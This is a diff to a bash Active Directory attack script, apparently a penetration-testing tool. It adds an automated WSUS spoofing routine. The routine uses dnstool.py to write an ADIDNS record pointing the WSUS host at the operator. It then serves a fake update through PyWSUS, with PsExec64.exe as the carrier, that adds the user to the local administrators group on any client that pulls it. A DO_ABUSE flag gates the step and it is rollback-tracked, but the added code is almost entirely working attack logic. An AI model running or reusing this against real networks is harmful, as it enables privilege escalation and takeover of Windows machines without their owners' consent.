@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.27.1"
+readonly VERSION="1.28.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -2228,6 +2228,42 @@ phase_wsus() {
 
     if [[ "$wscheme" == "http" ]]; then
         loot "★ WSUS on HTTP :${wport} (no SSL) → SPOOFABLE: a client pulling updates over HTTP can be pushed a fake update = SYSTEM"
+
+        # AUTO — but ONLY if we actually hold the PERMISSION. The permission for the
+        # DNS-redirect spoof is DNS-write over the WSUS host: we TEST it by adding the
+        # record; if it is denied we do nothing automatic and fall back to the playbook.
+        # Also needs a Microsoft-signed carrier (e.g. PsExec64.exe) — we can't ship it.
+        local carrier dx wlabel="${wsrv%%.*}" dauth
+        carrier=$(ls "$OUTDIR"/PsExec*.exe ./PsExec*.exe 2>/dev/null | head -1)
+        dx="$(external_tool krbrelayx/dnstool.py)"
+        if [[ "$DO_ABUSE" == "1" && -n "$pw" && -n "$dx" && -n "$ip" && -n "$wsrv" && -n "$carrier" ]] \
+           && { [[ -n "$PASS" || -n "$HASH" ]]; }; then
+            dauth=$( [[ -n "$PASS" ]] && echo "-p $PASS" || echo "-hashes :${HASH##*:}" )
+            subsection "AUTO WSUS spoof · permission test (ADIDNS write) → PyWSUS"
+            warn "Disruptive: repoints WSUS host '$wlabel' to you ($ip) and serves a fake update. Rollback-tracked, time-boxed."
+            local addout; addout=$(python3 "$dx" -u "${DOMAIN}\\${USER}" $dauth -r "$wlabel" -a add -d "$ip" "$DC_IP" 2>&1)
+            echo "$addout" | tee -a "$LOGFILE"
+            if grep -qiE 'success|added|Result: 0|LDAP operation.*succe' <<<"$addout"; then
+                loot "★ Permission CONFIRMED (DNS write over '$wlabel') → auto-spoofing"
+                rb_record "ADIDNS WSUS redirect: $wlabel -> $ip" "python3 $dx -u '${DOMAIN}\\${USER}' $dauth -r '$wlabel' -a remove $DC_IP"
+                ( cd "$OUTDIR" && timeout -k 10 "${WSUS_TIMEOUT:-180}" python3 "$pw" -H "$ip" -p "$wport" -e "$carrier" \
+                    -c "/accepteula /s cmd.exe /c \"net localgroup administrators $USER /add\"" 2>&1 \
+                    | tee -a "$LOGFILE" | tee wsus_pywsus.log ) &
+                local wpid=$!
+                info "PyWSUS serving on :$wport for ${WSUS_TIMEOUT:-180}s — waiting for a client update cycle…"
+                wait "$wpid" 2>/dev/null || true
+                grep -qiE 'malicious|update sent|client connected|reporting|SYSTEM' "$OUTDIR/wsus_pywsus.log" 2>/dev/null \
+                    && loot "★ A client pulled our update → wsus_pywsus.log" \
+                    || info "No client pulled an update in the window (clients may poll infrequently)"
+                python3 "$dx" -u "${DOMAIN}\\${USER}" $dauth -r "$wlabel" -a remove "$DC_IP" >/dev/null 2>&1 \
+                    && info "ADIDNS WSUS record reverted"
+            else
+                info "No DNS-write permission over '$wlabel' (add denied) → not auto-abusable by this user; playbook below."
+            fi
+        elif [[ "$DO_ABUSE" == "1" && -z "$carrier" ]]; then
+            info "WSUS auto-spoof ready but no Microsoft-signed carrier found — drop PsExec64.exe in $OUTDIR to enable it."
+        fi
+
         subsection "WSUS spoofing playbook (needs a MITM position between a client and ${wsrv:-$probe})"
         detail "  # listener IP auto-derived: ${ip:-<your-ip>}   ·   WSUS: ${wsrv:-$probe}:${wport}"
         detail "  # 1) Carrier = a Microsoft-SIGNED binary (e.g. PsExec64.exe)."
